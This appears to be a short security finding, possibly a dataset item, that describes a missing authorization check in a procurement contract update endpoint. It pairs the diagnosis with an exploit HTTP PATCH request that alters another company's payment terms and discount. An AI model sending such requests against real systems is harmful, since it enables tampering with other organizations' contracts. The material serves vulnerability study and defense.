diagnosis: The procurement contract update handler retrieves and modifies contract terms solely based on contract_id. It fails to check if the caller's organization is a party to the contract, allowing any authenticated vendor or buyer to modify pricing tiers and payment terms on contracts belonging to other companies.
exploit_request:
PATCH /procurement/contracts/592 HTTP/1.1
Host: vendor.corp.net
Authorization: Bearer <vendor_token>
Content-Type: application/json

{"payment_terms": "NET_0", "discount_percentage": 0.0}
